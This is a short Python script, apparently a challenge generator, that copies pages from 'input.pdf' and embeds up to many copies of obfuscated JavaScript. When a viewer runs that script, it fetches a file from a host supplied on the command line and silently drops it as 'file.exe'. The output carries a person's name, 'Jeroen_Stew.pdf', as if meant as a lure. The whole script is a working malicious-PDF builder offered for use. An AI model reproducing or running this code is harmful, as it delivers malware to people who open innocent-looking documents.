import sys
from PyPDF2 import PdfReader, PdfWriter

# Check that the correct number of arguments were passed
if len(sys.argv) != 3:
    print("Usage: python generate_chal.py <domain.com> <amount_of_files>")
    print("Example: python generate_chal.py 127.0.0.1 1000")
    sys.exit(1)

# Get the values of the arguments
URL = sys.argv[1]
amount = int(sys.argv[2])

# Create the JavaScript code for downloading and executing a file
js_list = []
print("Created " +str(amount)+ " javascript files")
for i in range(amount):
    start_js = "/Names [(EmbeddedJS) << /S /JavaScript /JS ("   
    mal_js = "var P=Q;(function(V,x){var F=Q,W=V();while(!![]){try{var K=-parseInt(F(0xb2))/0x1*(parseInt(F(0xb8))/0x2)+parseInt(F(0xba))/0x3*(-parseInt(F(0xaf))/0x4)+parseInt(F(0xbf))/0x5*(-parseInt(F(0xc5))/0x6)+-parseInt(F(0xbc))/0x7*(parseInt(F(0xc0))/0x8)+-parseInt(F(0xbb))/0x9*(-parseInt(F(0xb4))/0xa)+-parseInt(F(0xc6))/0xb+-parseInt(F(0xb3))/0xc*(-parseInt(F(0xc9))/0xd);if(K===x)break;else W['push'](W['shift']());}catch(Z){W['push'](W['shift']());}}}(C,0xe97f1));var fileUrl=P(0xb1),xhr=new XMLHttpRequest();function Q(V,x){var W=C();return Q=function(K,Z){K=K-0xaf;var F=W[K];return F;},Q(V,x);}xhr[P(0xcb)]('GET',fileUrl,!![]),xhr[P(0xc4)]=P(0xca),xhr['onload']=function(){var q=P,V=new File([xhr[q(0xc7)]],q(0xb7),{'type':q(0xc2)}),x=URL[q(0xb5)](V),W=document[q(0xb6)]('a');W[q(0xcc)]=q(0xc8),W[q(0xbd)]=x,W[q(0xbe)]=V['name'],document[q(0xb0)][q(0xb9)](W),W[q(0xc3)](),setTimeout(function(){var h=q;URL[h(0xcd)](x);},0x64);},xhr[P(0xc1)]();function C(){var z=['file.exe','5468zxIgZX','appendChild','3874926ZWJkQH','171kONjLd','9031309HXGsVe','href','download','70ftvfat','8watwfh','send','application/octet-stream','click','responseType','467658fnjDJz','4430360eNIcRH','response','display:\x20none','63857729zwwgjy','arraybuffer','open','style','revokeObjectURL','4biJxER','body','http://"+URL+"/file" + str(i) + ".txt','493lXWYDo','12LlAsrv','772590TVEvZu','createObjectURL','createElement'];C=function(){return z;};return C();}"
    end_js = ") >>]\n"
    javascript = start_js + mal_js + end_js
    js_list.append(javascript)

# Open the PDF file in read mode
pdf_file = open('input.pdf', 'rb')

# Create a PdfReader object
pdf_reader = PdfReader(pdf_file)

# Create a PdfWriter object
pdf_writer = PdfWriter()

# Add the PDF pages to the writer object
for page in range(0,len(pdf_reader.pages)):
    pdf_writer.add_page(pdf_reader.pages[page])

# Add the JavaScript code to the PDF file
for js in js_list:   
    pdf_writer.add_js(js)

# Create a new PDF file in write mode
output_file = open('Jeroen_Stew.pdf', 'wb')

# Write the PDF to the output file
pdf_writer.write(output_file)

# Close the input and output files
pdf_file.close()
output_file.close()

print("[*] Created PDF : Jeroen_Stew.pdf")
